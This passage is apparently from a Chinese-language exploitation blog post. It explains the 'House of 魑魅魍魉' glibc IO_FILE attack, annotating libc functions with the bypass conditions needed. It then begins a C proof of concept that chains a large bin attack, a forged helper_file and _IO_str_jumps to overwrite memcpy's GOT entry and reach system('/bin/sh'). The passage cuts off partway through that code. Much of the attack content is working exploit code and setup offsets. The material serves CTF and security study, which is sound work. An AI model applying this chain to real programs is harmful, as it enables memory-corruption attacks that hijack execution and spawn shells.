<h2 id="House-of-魑魅魍魉"><a href="#House-of-魑魅魍魉" class="headerlink" title="House of 魑魅魍魉"></a>House of 魑魅魍魉</h2><p>一般来说一类跳表只有一个，但 <code>_IO_helper_jumps</code> 比较特殊，通过下面可以看出，跳表会根据 <code>COMPILE_WPRINTF</code> 值不同而生成不同的，但可能 libc 在编译时调用两次，所以<strong>我们可以在内存中看到两个 <code>_IO_helper_jumps</code> ，</strong>每种各一个。其中，**<code>COMPILE_WPRINTF == 0</code> 先生成，<code>COMPILE_WPRINTF == 1</code> 后生成。**</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_helper_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT (finish, _IO_wdefault_finish),</span><br><span class="line">  JUMP_INIT (overflow, _IO_helper_overflow),</span><br><span class="line">  JUMP_INIT (underflow, _IO_default_underflow),</span><br><span class="line">  JUMP_INIT (uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT (xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT (xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT (seekoff, _IO_default_seekoff),</span><br><span class="line">  JUMP_INIT (seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT (setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT (sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT (doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT (read, _IO_default_read),</span><br><span class="line">  JUMP_INIT (write, _IO_default_write),</span><br><span class="line">  JUMP_INIT (seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT (close, _IO_default_close),</span><br><span class="line">  JUMP_INIT (stat, _IO_default_stat)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_helper_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT (finish, _IO_default_finish),</span><br><span class="line">  JUMP_INIT (overflow, _IO_helper_overflow),</span><br><span class="line">  JUMP_INIT (underflow, _IO_default_underflow),</span><br><span class="line">  JUMP_INIT (uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT (pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT (xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT (xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT (seekoff, _IO_default_seekoff),</span><br><span class="line">  JUMP_INIT (seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT (setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT (sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT (doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT (read, _IO_default_read),</span><br><span class="line">  JUMP_INIT (write, _IO_default_write),</span><br><span class="line">  JUMP_INIT (seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT (close, _IO_default_close),</span><br><span class="line">  JUMP_INIT (stat, _IO_default_stat)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>同样，面对不同的 <code>COMPILE_WPRINTF</code> 所对应的 <code>helper_file</code> 也有所不同，区别在于是否需要伪造 <code>struct _IO_wide_data _wide_data;</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">helper_file</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">f</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> _<span class="title">wide_data</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    FILE *_put_stream;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></div>

<p>同样，<code>_IO_helper_overflow</code> 这个函数在内存中也有 2 份。通过测试发现，如果使用 <code>COMPILE_WPRINTF == 0</code> 的情况，在攻击过程中 <code>s-&gt;_IO_write_base</code> 会变成 <code>largebin-&gt;fd_nextsize</code> 指针，从而被强制修改无法控制。为了方便，我们使用 <code>COMPILE_WPRINTF == 1</code> 所生成的 <code>_IO_helper_overflow</code> 。该函数在攻击过程中的作用是控制 <code>_IO_default_xsputn</code> 的三个参数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> _IO_helper_overflow (FILE *s, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *target = ((<span class="keyword">struct</span> helper_file*) s)-&gt;_put_stream;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  <span class="type">int</span> used = s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (used)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 利用这个链，显然这三个参数我们都可控。</span></span><br><span class="line">      <span class="type">size_t</span> written = _IO_sputn (target, s-&gt;_wide_data-&gt;_IO_write_base, used);</span><br><span class="line">      <span class="keyword">if</span> (written == <span class="number">0</span> || written == WEOF)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">      __wmemmove (s-&gt;_wide_data-&gt;_IO_write_base,</span><br><span class="line">          s-&gt;_wide_data-&gt;_IO_write_base + written,</span><br><span class="line">          used - written);</span><br><span class="line">      s-&gt;_wide_data-&gt;_IO_write_ptr -= written;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">// 如果使用这条链，_IO_write_ptr 将处于 largebin 的 bk_size 指针处</span></span><br><span class="line">  <span class="type">int</span> used = s-&gt;_IO_write_ptr - s-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (used)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> written = _IO_sputn (target, s-&gt;_IO_write_base, used);</span><br><span class="line">      <span class="keyword">if</span> (written == <span class="number">0</span> || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      memmove (s-&gt;_IO_write_base, s-&gt;_IO_write_base + written,</span><br><span class="line">           used - written);</span><br><span class="line">      s-&gt;_IO_write_ptr -= written;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> PUTC (c, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过上面函数可以清楚看出，在执行 <code>size_t written = _IO_sputn (target, s-&gt;_wide_data-&gt;_IO_write_base, used);</code> 时</p>
<ul>
<li><code>FILE *target = ((struct helper_file*) s)-&gt;_put_stream;</code> 可控。</li>
<li><code>s-&gt;_wide_data-&gt;_IO_write_base</code> 可控。</li>
<li><code>int used = s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base;</code> 可控。</li>
</ul>
<p>就达成了3个参数可控的要求，然后通过修改 <code>((struct helper_file*) s)-&gt;_put_stream</code> 的 <code>vtable</code> 指向 <code>_IO_str_jumps</code> ，使其调用 <code>_IO_default_xsputn</code> 函数。</p>
<p><strong>需要注意的是，<code>s-&gt;_wide_data-&gt;_IO_write_ptr</code> 和 <code>s-&gt;_wide_data-&gt;_IO_write_base</code> 是 <code>wchar_t *</code> 类型，也就是说used实际是 <code>(s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base) &gt;&gt; 2</code> 。</strong> （在 Linux 系统上，宽字符通常使用 UTF-32 编码表示，而 UTF-32 使用 32 位表示一个字符，因此 <code>wchar_t</code> 类型在 Linux 上通常为 4 字节。）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/da19e1e8f8bdd46028f20d7133c41b81.png"
                     
                ><br><code>_IO_default_xsputn</code> 函数内要绕过的内容较多。该函数在攻击过程中的作用是两次调用 <code>__mempcpy</code> ，第一次利用任意地址写修改 <code>__mempcpy</code> 对应的 got 表中的值，第二次调用 <code>__mempcpy</code> 劫持程序执行流。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">          <span class="comment">// 要 more &gt; count，能再次返回执行 __mempcpy</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">          <span class="comment">// 要 count &gt; 20</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 利用此处实现 house of 借刀杀人，</span></span><br><span class="line">          <span class="comment">// 修改 memcpy 的内容为setcontext</span></span><br><span class="line">          <span class="comment">// 再次返回的时候就能够实现 house of 一骑当千</span></span><br><span class="line">          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">          s += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">          <span class="type">ssize_t</span> i;</span><br><span class="line">          <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">        *p++ = *s++;</span><br><span class="line">          f-&gt;_IO_write_ptr = p;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">// 要 more &gt; count，能再次返回执行 __mempcpy</span></span><br><span class="line">      more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 绕过下面这一行，再次执行for循环的内容</span></span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF) </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br></pre></td></tr></table></figure></div>

<p>需要绕过内容总结如下</p>
<ul>
<li><p>需要 <code>more</code> &gt; <code>count</code>，能再次返回执行 <code>__mempcpy</code>，且要想再次返回执行 <code>memcpy</code>，由于此时 <code>f-&gt;_IO_write_ptr</code> 被  <code>_IO_str_overflow</code> 函数修改为指向 <code>&quot;/bin/sh&quot;</code> 字符串，因此 <code> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code> 可能为一个很大的值，导致 <code>count &gt; more</code>，进而更新 <code>count</code> 为 <code>more</code> ，因此再次循环时要求 <code>more &gt; 20</code> 。由于上一次循环中依次执行了 <code>more -= count</code> 和 <code>more--</code> 语句，因此要求 <code>more</code> ≥ <code>count + 1 + 21</code> 。 </p>
</li>
<li><p>需要 <code>count</code> &gt; 20，因此 <code>count</code> 至少为 21 。 </p>
</li>
<li><p>第一次执行 <code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code> 时，</p>
<ul>
<li><p><code>_IO_write_ptr</code> 为 <code>__mempcpy</code> 表项，</p>
</li>
<li><p>s 为要写入的内容。</p>
</li>
</ul>
</li>
<li><p>再次执行<code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code> 时，</p>
<ul>
<li><p>需要绕过 <code>if (more == 0 || _IO_OVERFLOW (f, (unsigned char) *s++) == EOF)</code> ，具体绕过方式接下来会介绍。</p>
</li>
<li><p><code>f-&gt;_IO_write_ptr</code> 为 <code>rdi</code> ，<code>s</code> 为 <code>rsi</code> ，<code>count</code> 为 <code>rdx</code> 。</p>
</li>
</ul>
</li>
</ul>
<p>同样，执行 <code>_IO_str_overflow</code> 需要绕过内容也比较多。该函数的作用是控制 <code>fp-&gt;_IO_write_ptr</code> ，从而控制 <code>_IO_default_xsputn</code> 第二次循环中 <code>__mempcpy</code> 的第一个参数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">    <span class="comment">// 需要进入来控制 fp-&gt;_IO_write_ptr ， _flags==0x400</span></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; <span class="comment">// 控制 fp-&gt;_IO_write_ptr 指向 &amp;&quot;/bin/sh&quot; - 1 作为下一次 memcpy(system) 的第一个参数。</span></span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">    <span class="comment">// 不能进入，要让 _IO_blen (fp)  ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) 足够大。</span></span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"> </span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">      <span class="comment">// 此处 fp-&gt;_IO_write_ptr 自加1，所以之前要少1.</span></span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure></div>

<p>需要绕过内容总结如下：</p>
<ul>
<li><code>_flags = 0x400</code> 。</li>
<li><code>fp-&gt;_IO_read_ptr</code> 为再次执行 <code>__mempcpy (f-&gt;_IO_write_ptr, s, count);</code> 的 <code>rdi - 1</code> 。</li>
<li><code>(fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base</code> 要足够大，一般设置 <code>(fp)-&gt;_IO_buf_end = 0xFFFFFFFFFFFFFFF0</code> 即可。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/60649d737092dba6af8cb8c9977061aa.png"
                     
                ></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_cmwl" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x77040</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2660</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *fake_helper_file = large - <span class="number">2</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_wide_data = fake_helper_file + <span class="number">28</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_put_stream = fake_helper_file + <span class="number">6</span>;</span><br><span class="line">    <span class="type">size_t</span> *write_base = fake_helper_file + <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> memcpy_got_addr = libc_base + <span class="number">0x1d1040</span>;</span><br><span class="line">    <span class="type">size_t</span> IO_helper_jumps_addr = libc_base + <span class="number">0x1cdb20</span>;</span><br><span class="line">    <span class="type">size_t</span> IO_str_jumps_addr = libc_base + <span class="number">0x1ce720</span>;</span><br><span class="line"></span><br><span class="line">    fake_helper_file[<span class="number">4</span>] = <span class="number">0</span>;                        <span class="comment">// _IO_write_base</span></span><br><span class="line">    fake_helper_file[<span class="number">5</span>] = <span class="number">1</span>;                        <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_helper_file[<span class="number">17</span>] = (<span class="type">size_t</span>) large + <span class="number">0x1000</span>; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    fake_helper_file[<span class="number">20</span>] = (<span class="type">size_t</span>) fake_wide_data; <span class="comment">// _wide_data</span></span><br><span class="line">    fake_helper_file[<span class="number">27</span>] = IO_helper_jumps_addr;    <span class="comment">// vtable -&gt; _IO_helper_jumps</span></span><br><span class="line">    fake_helper_file[<span class="number">57</span>] = (<span class="type">size_t</span>) fake_put_stream;<span class="comment">// _put_stream</span></span><br><span class="line"></span><br><span class="line">    fake_wide_data[<span class="number">3</span>] = (<span class="type">size_t</span>) write_base;           <span class="comment">// _IO_write_base -&gt; write_base</span></span><br><span class="line">    fake_wide_data[<span class="number">4</span>] = (<span class="type">size_t</span>) write_base + <span class="number">0x80</span> * <span class="number">4</span>;<span class="comment">// _IO_write_base -&gt; write_base +</span></span><br><span class="line"></span><br><span class="line">    fake_put_stream[<span class="number">0</span>] = <span class="number">0x400</span>;                      <span class="comment">// _flags</span></span><br><span class="line">    fake_put_stream[<span class="number">1</span>] = (<span class="type">size_t</span>) &amp;write_base[<span class="number">2</span>] - <span class="number">1</span>;<span class="comment">// _IO_read_ptr -&gt; &amp;&quot;/bin/sh&quot; -1</span></span><br><span class="line">    fake_put_stream[<span class="number">4</span>] = memcpy_got_addr - <span class="number">0x20</span>;     <span class="comment">// _IO_write_base</span></span><br><span class="line">    fake_put_stream[<span class="number">5</span>] = memcpy_got_addr;            <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    